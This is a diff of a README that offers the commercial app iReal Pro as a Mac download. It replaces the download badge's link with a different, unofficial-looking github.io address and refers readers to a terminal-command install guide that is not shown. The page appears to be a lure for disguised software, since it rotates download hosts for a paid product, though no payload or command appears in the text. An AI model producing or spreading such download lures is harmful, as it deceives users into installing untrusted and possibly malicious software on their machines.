@@ -3,7 +3,7 @@
 
 iReal Pro for Mac is a powerful music practice tool 🎶 that provides realistic-sounding backing tracks, customizable chord charts, and tools for learning, rehearsing, and performing. Follow the instructions below to install iReal Pro on your Mac easily.
 
-[![Download iReal Pro For Mac](https://img.shields.io/badge/Download%20for-MacOS-000000?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/irealpro)
+[![Download iReal Pro For Mac](https://img.shields.io/badge/Download%20for-MacOS-000000?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/irealpro)
 
 If the download button doesn’t work, please follow the installation guide below using the terminal command.
 
